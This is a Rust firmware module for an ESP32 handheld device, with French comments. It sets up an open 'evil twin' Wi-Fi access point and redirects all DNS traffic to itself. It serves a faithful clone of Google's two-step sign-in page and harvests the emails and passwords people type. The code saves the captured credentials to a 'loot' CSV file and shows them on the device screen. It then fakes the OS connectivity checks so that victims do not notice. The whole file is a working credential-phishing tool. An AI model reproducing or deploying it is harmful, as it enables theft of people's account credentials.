//! AP « evil twin » + portail captif Google (phishing d'identifiants).
//! Page Google en 2 étapes intégrée — aucune dépendance SD.
//! Sauvegarde sur /spiflash si SD absente.

use embedded_graphics::{
    mono_font::{ascii::FONT_6X10, MonoTextStyle},
    pixelcolor::Rgb565,
    prelude::*,
    primitives::{PrimitiveStyleBuilder, Rectangle},
    text::Text,
};
use esp_idf_svc::eventloop::EspSystemEventLoop;
use esp_idf_svc::hal::delay::FreeRtos;
use esp_idf_svc::hal::gpio::{Input, PinDriver};
use esp_idf_svc::hal::modem::WifiModemPeripheral;
use esp_idf_svc::http::server::{Configuration as HttpConfig, EspHttpServer};
use esp_idf_svc::http::Method;
use esp_idf_svc::nvs::EspDefaultNvsPartition;
use esp_idf_svc::sys::{
    esp_netif_dhcp_option_id_t_ESP_NETIF_DOMAIN_NAME_SERVER,
    esp_netif_dhcp_option_mode_t_ESP_NETIF_OP_SET, esp_netif_dhcps_option, esp_netif_dhcps_start,
    esp_netif_dhcps_stop, esp_netif_dns_info_t, esp_netif_dns_type_t_ESP_NETIF_DNS_MAIN,
    esp_netif_get_handle_from_ifkey, esp_netif_set_dns_info, esp_wifi_ap_get_sta_list,
    wifi_sta_list_t,
};
use esp_idf_svc::wifi::{
    AccessPointConfiguration, AuthMethod, BlockingWifi, Configuration, EspWifi,
};
use log::info;
use std::sync::atomic::{AtomicBool, AtomicU32, AtomicUsize, Ordering};
use std::sync::Arc;
use std::sync::Mutex;
use std::time::{SystemTime, UNIX_EPOCH};

const BG: Rgb565 = Rgb565::new(1, 4, 2);
const ORANGE: Rgb565 = Rgb565::new(31, 35, 0);
const WHITE: Rgb565 = Rgb565::new(31, 63, 31);
const GRAY: Rgb565 = Rgb565::new(9, 22, 13);
const DIM: Rgb565 = Rgb565::new(16, 34, 20);

const GOOGLE_PAGE: &str = r##"<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#ffffff">
<title>Connexion : comptes Google</title>
<style>
:root{--blue:#1a73e8;--txt:#202124;--sub:#5f6368;--line:#dadce0}
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%}
body{font-family:'Google Sans',Roboto,arial,sans-serif;color:var(--txt);background:#fff;display:flex;flex-direction:column;min-height:100%}
.wrap{flex:1;display:flex;align-items:flex-start;justify-content:center}
.card{width:100%;max-width:448px;margin:0 auto;padding:48px 40px 36px;border:1px solid var(--line);border-radius:8px;margin-top:24px}
.logo{margin-bottom:16px}
h1{font-family:'Google Sans',Roboto,arial,sans-serif;font-size:24px;font-weight:400;line-height:1.33;margin:16px 0 0}
.sub{font-size:16px;line-height:1.5;margin-top:8px}
.chip{display:inline-flex;align-items:center;gap:8px;margin-top:14px;border:1px solid var(--line);border-radius:16px;padding:3px 12px 3px 4px;font-size:14px;color:var(--txt)}
.chip .ava{width:24px;height:24px;border-radius:50%;background:#1a73e8;color:#fff;display:flex;align-items:center;justify-content:center;font-size:13px;text-transform:uppercase}
.chip svg{width:18px;height:18px;margin-left:2px;fill:var(--sub)}
.field{position:relative;margin-top:26px}
.field input{width:100%;height:56px;padding:13px 15px;border:1px solid var(--sub);border-radius:8px;font-size:16px;color:var(--txt);outline:none;background:transparent}
.field input:focus{border:2px solid var(--blue);padding:12px 14px}
.field label{position:absolute;left:9px;top:16px;padding:0 6px;background:#fff;color:var(--sub);font-size:16px;transition:.15s ease;pointer-events:none}
.field input:focus+label,.field input:not(:placeholder-shown)+label{top:-9px;font-size:12px}
.field input:focus+label{color:var(--blue)}
.forgot{display:inline-block;margin-top:12px;color:var(--blue);font-size:14px;font-weight:500;text-decoration:none}
.forgot:hover{text-decoration:underline}
.show{display:flex;align-items:center;gap:12px;margin-top:20px;font-size:14px;color:var(--txt)}
.show input{width:18px;height:18px;accent-color:var(--blue)}
.info{font-size:14px;color:var(--sub);line-height:1.5;margin-top:14px}
.info a{color:var(--blue);text-decoration:none}
.row{display:flex;justify-content:space-between;align-items:center;margin-top:34px}
button{background:var(--blue);color:#fff;border:none;height:36px;padding:0 24px;border-radius:4px;font-family:'Google Sans',Roboto,arial,sans-serif;font-size:14px;font-weight:500;letter-spacing:.25px;cursor:pointer}
button:hover{background:#1b66c9;box-shadow:0 1px 2px rgba(60,64,67,.3),0 1px 3px 1px rgba(60,64,67,.15)}
.link{color:var(--blue);background:none;border:none;font-size:14px;font-weight:500;cursor:pointer;padding:8px;border-radius:4px;text-decoration:none}
.link:hover{background:rgba(26,115,232,.04)}
.foot{display:flex;justify-content:space-between;align-items:center;padding:14px 24px;font-size:12px;color:var(--sub)}
.foot select{border:none;background:none;color:var(--sub);font-size:12px;font-family:inherit}
.foot nav a{color:var(--sub);text-decoration:none;margin-left:24px}
.hidden{display:none}
@media(max-width:450px){.card{border:none;margin-top:0;padding:36px 24px}}
</style>
</head>
<body>
<div class="wrap"><div class="card">
<div class="logo">
<svg viewBox="0 0 48 48" width="42" height="42" aria-hidden="true">
<path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
<path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
<path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
<path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
</svg>
</div>
<div id="step1">
<h1>Connexion</h1>
<p class="sub">Utilisez votre compte Google</p>
<form onsubmit="goStep2(event)" novalidate>
<div class="field">
<input type="email" id="email" placeholder=" " autocomplete="username" autofocus>
<label for="email">Adresse e-mail ou numero de telephone</label>
</div>
<a class="forgot" href="#">Adresse e-mail oubliee ?</a>
<p class="info">Vous n'etes pas sur votre ordinateur ? Utilisez le mode Invite pour vous connecter en toute confidentialite. <a href="#">En savoir plus sur l'utilisation du mode Invite</a></p>
<div class="row">
<a class="link" href="#">Creer un compte</a>
<button type="submit">Suivant</button>
</div>
</form>
</div>
<div id="step2" class="hidden">
<h1>Bienvenue</h1>
<div class="chip"><span class="ava" id="av"></span><span id="who"></span>
<svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg></div>
<form method="POST" action="/login">
<input type="hidden" name="email" id="hemail">
<div class="field">
<input type="password" name="password" id="pw" placeholder=" " autocomplete="current-password" autofocus>
<label for="pw">Saisissez votre mot de passe</label>
</div>
<label class="show"><input type="checkbox" onclick="tog()"> Afficher le mot de passe</label>
<div class="row">
<a class="link" href="#" onclick="goBack();return false">Essayer une autre methode</a>
<button type="submit">Suivant</button>
</div>
</form>
</div>
</div></div>
<div class="foot">
<select><option>Francais (France)</option></select>
<nav><a href="#">Aide</a><a href="#">Confidentialite</a><a href="#">Conditions</a></nav>
</div>
<script>
function goStep2(e){e.preventDefault();var m=document.getElementById('email').value.trim();if(!m)return;document.getElementById('hemail').value=m;document.getElementById('who').textContent=m;document.getElementById('av').textContent=m.charAt(0);document.getElementById('step1').className='hidden';document.getElementById('step2').className='';document.getElementById('pw').focus()}
function goBack(){document.getElementById('step1').className='';document.getElementById('step2').className='hidden'}
function tog(){var p=document.getElementById('pw');p.type=p.type==='password'?'text':'password'}
</script>
</body>
</html>"##;

#[derive(Clone)]
struct Credential {
    email: String,
    // Gardé en mémoire pour un affichage éventuel ; déjà persisté dans le CSV.
    #[allow(dead_code)]
    password: String,
    timestamp: String,
}

static CAPTURED_CREDS: Mutex<Vec<Credential>> = Mutex::new(Vec::new());

/// Passe à `true` dès qu'un client a soumis ses identifiants. Les endpoints de
/// détection de portail captif répondent alors « online » pour que l'OS ferme
/// la fenêtre du portail et laisse la victime reprendre sa navigation.
static PORTAL_DONE: AtomicBool = AtomicBool::new(false);

/// Page renvoyée APRÈS soumission (au lieu d'un JSON) : une vraie page HTML
/// « connexion en cours » qui redirige vers le vrai Google. La victime ne voit
/// que du feu et croit s'être connectée normalement.
const SUCCESS_PAGE: &str = r##"<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connexion…</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans',Roboto,arial,sans-serif;background:#fff;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:22px}
.bar{position:fixed;top:0;left:0;right:0;height:3px;background:#e8f0fe;overflow:hidden}
.bar span{position:absolute;top:0;height:100%;width:35%;background:#1a73e8;animation:load 1.1s infinite}
@keyframes load{0%{left:-35%}100%{left:100%}}
svg{width:46px;height:46px}
p{color:#5f6368;font-size:14px}
</style>
</head>
<body>
<div class="bar"><span></span></div>
<svg viewBox="0 0 48 48" aria-hidden="true">
<path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
<path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
<path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
<path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
</svg>
<p>Un instant…</p>
</body>
</html>"##;

fn add_credential(email: String, password: String) -> usize {
    let cred = Credential {
        email,
        password,
        timestamp: get_timestamp(),
    };
    if let Ok(mut g) = CAPTURED_CREDS.lock() {
        g.push(cred);
        return g.len();
    }
    0
}

fn get_credentials() -> Vec<Credential> {
    CAPTURED_CREDS.lock().map(|g| g.clone()).unwrap_or_default()
}

fn get_timestamp() -> String {
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    format!(
        "{:02}:{:02}:{:02}",
        (now % 86400) / 3600,
        (now % 3600) / 60,
        now % 60
    )
}

unsafe fn force_dns_dhcp(ip_addr: u32) {
    let ap = esp_netif_get_handle_from_ifkey(c"WIFI_AP_DEF".as_ptr() as *const _);
    if ap.is_null() {
        return;
    }
    esp_netif_dhcps_stop(ap);
    let mut offer: u8 = 1;
    esp_netif_dhcps_option(
        ap,
        esp_netif_dhcp_option_mode_t_ESP_NETIF_OP_SET,
        esp_netif_dhcp_option_id_t_ESP_NETIF_DOMAIN_NAME_SERVER,
        &mut offer as *mut u8 as _,
        1,
    );
    let mut dns: esp_netif_dns_info_t = core::mem::zeroed();
    dns.ip.u_addr.ip4.addr = ip_addr;
    esp_netif_set_dns_info(ap, esp_netif_dns_type_t_ESP_NETIF_DNS_MAIN, &mut dns);
    esp_netif_dhcps_start(ap);
}

fn url_decode(s: &str) -> String {
    let mut r = String::new();
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '%' {
            let mut h = String::new();
            for _ in 0..2 {
                if let Some(n) = chars.next() {
                    h.push(n);
                }
            }
            if let Ok(b) = u8::from_str_radix(&h, 16) {
                r.push(b as char);
            }
        } else if c == '+' {
            r.push(' ');
        } else {
            r.push(c);
        }
    }
    r
}

fn save_cred_to_storage(ssid: &str, email: &str, password: &str) {
    let root = if std::fs::metadata("/sdcard").is_ok() {
        "/sdcard"
    } else {
        "/spiflash"
    };
    let _ = std::fs::create_dir_all(&format!("{}/loot", root));
    let _ = std::fs::write(
        format!("{}/loot/creds.csv", root),
        format!("{},{},{},{}\n", get_timestamp(), ssid, email, password),
    );
}

pub fn run<D>(
    modem: impl WifiModemPeripheral,
    sys_loop: EspSystemEventLoop,
    nvs: EspDefaultNvsPartition,
    display: &mut D,
    back: &PinDriver<'_, Input>,
    ssid: &str,
    _portal_path: &str,
) -> anyhow::Result<()>
where
    D: DrawTarget<Color = Rgb565>,
    D::Error: core::fmt::Debug,
{
    info!("Evil twin: SSID='{}' (page Google integree)", ssid);
    // Réarme le portail à chaque lancement (le static survit entre deux entrées
    // dans le mode sans reboot) : sinon la détection resterait « online ».
    PORTAL_DONE.store(false, Ordering::Relaxed);
    let mut wifi = BlockingWifi::wrap(EspWifi::new(modem, sys_loop.clone(), Some(nvs))?, sys_loop)?;
    wifi.set_configuration(&Configuration::AccessPoint(AccessPointConfiguration {
        ssid: ssid
            .try_into()
            .map_err(|_| anyhow::anyhow!("SSID invalide"))?,
        auth_method: AuthMethod::None,
        channel: 6,
        max_connections: 4,
        ..Default::default()
    }))?;
    wifi.start()?;
    unsafe {
        force_dns_dhcp(192 | (168 << 8) | (71 << 16) | (1 << 24));
    }

    let dns_handle = std::thread::Builder::new()
        .stack_size(4096)
        .spawn(|| super::captive_dns::run([192, 168, 71, 1]))?;
    let visits = AtomicU32::new(0);
    let cred_count = AtomicUsize::new(0);

    let mut server = EspHttpServer::new(&HttpConfig {
        uri_match_wildcard: true,
        ..Default::default()
    })?;

    server.fn_handler("/", Method::Get, |req| {
        let data = GOOGLE_PAGE.as_bytes();
        let mut resp = req.into_ok_response()?;
        for c in data.chunks(1024) {
            resp.write(c)?;
        }
        Ok::<(), esp_idf_svc::io::EspIOError>(())
    })?;

    let ssid_owned: Arc<str> = Arc::from(ssid.to_string());
    server.fn_handler("/login", Method::Post, move |mut req| {
        let mut body = Vec::new();
        let mut buf = [0u8; 512];
        loop {
            match req.read(&mut buf) {
                Ok(0) | Err(_) => break,
                Ok(n) => body.extend_from_slice(&buf[..n]),
            }
        }
        if let Ok(s) = String::from_utf8(body) {
            let (mut email, mut pass) = (String::new(), String::new());
            for p in s.split('&') {
                if let Some(eq) = p.find('=') {
                    let v = url_decode(&p[eq + 1..]);
                    match &p[..eq] {
                        "email" | "username" => email = v,
                        "password" | "pass" => pass = v,
                        _ => {}
                    }
                }
            }
            if !email.is_empty() {
                add_credential(email.clone(), pass.clone());
                info!("Creds captures: {} / {}", email, pass);
                save_cred_to_storage(&ssid_owned, &email, &pass);
                PORTAL_DONE.store(true, Ordering::Relaxed);
                // Comportement « normal » : on renvoie une vraie page HTML de
                // redirection (pas de JSON visible), et on libère le portail.
                let data = SUCCESS_PAGE.as_bytes();
                let mut resp = req.into_response(
                    200,
                    Some("OK"),
                    &[("Content-Type", "text/html; charset=utf-8")],
                )?;
                for c in data.chunks(1024) {
                    resp.write(c)?;
                }
            } else {
                // Champ vide : on la renvoie discrètement sur le portail.
                // (corps non-vide comme les autres handlers pour forcer le flush)
                req.into_response(302, Some("Found"), &[("Location", "http://192.168.71.1/")])?
                    .write(b"redirect")?;
            }
        }
        Ok::<(), esp_idf_svc::io::EspIOError>(())
    })?;

    for p in &[
        "/generate_204",
        "/gen_204",
        "/hotspot-detect.html",
        "/ncsi.txt",
        "/connecttest.txt",
        "/redirect",
        "/canonical.html",
        "/success.txt",
    ] {
        server.fn_handler(p, Method::Get, |req| {
            if PORTAL_DONE.load(Ordering::Relaxed) {
                // Identifiants déjà capturés : on simule un vrai accès Internet
                // avec la réponse attendue par chaque OS, pour que la fenêtre de
                // portail captif se ferme et laisse l'utilisateur naviguer.
                let uri = req.uri().to_string();
                if uri.contains("204") {
                    req.into_response(204, Some("No Content"), &[])?;
                } else if uri.contains("ncsi") {
                    req.into_ok_response()?.write(b"Microsoft NCSI")?;
                } else if uri.contains("connecttest") {
                    req.into_ok_response()?.write(b"Microsoft Connect Test")?;
                } else if uri.contains("success") {
                    req.into_ok_response()?.write(b"success")?;
                } else {
                    req.into_ok_response()?.write(
                        b"<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>",
                    )?;
                }
            } else {
                req.into_response(302, Some("Found"), &[("Location", "http://192.168.71.1/")])?
                    .write(b"redirect")?;
            }
            Ok::<(), esp_idf_svc::io::EspIOError>(())
        })?;
    }

    server.fn_handler("/*", Method::Get, |req| {
        req.into_response(404, Some("Not Found"), &[])?
            .write(b"nf")?;
        Ok::<(), esp_idf_svc::io::EspIOError>(())
    })?;

    info!("Portail Google actif: http://192.168.71.1");

    loop {
        if back.is_low() {
            super::captive_dns::STOP.store(true, Ordering::Relaxed);
            let _ = dns_handle.join();
            return Ok(());
        }
        let mut sta: wifi_sta_list_t = unsafe { core::mem::zeroed() };
        unsafe { esp_wifi_ap_get_sta_list(&mut sta) };
        display.clear(BG).map_err(crate::anyhow_dbg)?;
        Rectangle::new(Point::new(0, 0), Size::new(240, 30))
            .into_styled(PrimitiveStyleBuilder::new().fill_color(GRAY).build())
            .draw(display)
            .map_err(crate::anyhow_dbg)?;
        Text::new(
            "Google Captif",
            Point::new(8, 19),
            MonoTextStyle::new(&FONT_6X10, ORANGE),
        )
        .draw(display)
        .map_err(crate::anyhow_dbg)?;
        let stats = format!(
            "Clients:{} Visites:{} Creds:{}",
            sta.num,
            visits.load(Ordering::SeqCst),
            cred_count.load(Ordering::SeqCst)
        );
        Text::new(
            &stats,
            Point::new(8, 52),
            MonoTextStyle::new(&FONT_6X10, WHITE),
        )
        .draw(display)
        .map_err(crate::anyhow_dbg)?;
        let creds = get_credentials();
        let mut y = 84;
        for i in 0..creds.len().min(4) {
            let c = &creds[creds.len() - 1 - i];
            let e = if c.email.len() > 24 {
                format!("{}...", &c.email[..21])
            } else {
                c.email.clone()
            };
            Text::new(
                &format!("{} {}", c.timestamp, e),
                Point::new(8, y),
                MonoTextStyle::new(&FONT_6X10, WHITE),
            )
            .draw(display)
            .map_err(crate::anyhow_dbg)?;
            y += 12;
        }
        if creds.is_empty() {
            Text::new(
                "En attente...",
                Point::new(8, y),
                MonoTextStyle::new(&FONT_6X10, DIM),
            )
            .draw(display)
            .map_err(crate::anyhow_dbg)?;
        }
        FreeRtos::delay_ms(2000);
    }
}
